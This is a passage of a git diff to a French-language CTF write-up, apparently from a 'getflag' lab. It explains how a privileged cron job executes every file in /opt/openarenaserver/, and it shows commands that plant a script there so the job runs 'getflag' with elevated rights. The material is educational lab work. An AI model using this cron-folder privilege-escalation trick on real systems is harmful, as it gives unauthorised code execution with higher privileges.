@@ -14,17 +14,16 @@ minute	hour	day	month	day
 > Donc toutes les 30 secondes la tâche: <code>su -c 'sh /usr/sbin/openarenaserver"</code> va s'executer
 
 On cat le fichier <code>/usr/sbin/openarenaserve</code> ce qui nous donne:
-<pre><code>#!/bin/sh
-
+```sh
+#!/bin/sh
 for i in /opt/openarenaserver/* ; do // Pour chaque fichier dans le dossier
 		(ulimit -t 5; bash -x "$i")	 // Avec un interval de 5 sc, executer le fichier
 		rm -f "$i"					 // Supprimer le fichier
 done
-</code></pre>
+```
 
 L'idée est de creer un fichier que l'on va mettre dans le dossier <code>/opt/openarenaserver/</code> afin qu'il s'exectue des que la tâche cron s'active:
-<pre><code>
-echo "getflag > /tmp/token" > /tmp/getflag.sh
+<pre><code>echo "getflag > /tmp/token" > /tmp/getflag.sh
 mv /tmp/getflag.sh /opt/openarenaserver/getflash.sh
 </code></pre>
 > On stocke dans <code>/tmp/token</code> le resultat car cron s'effectue en background et n'affiche pas de message
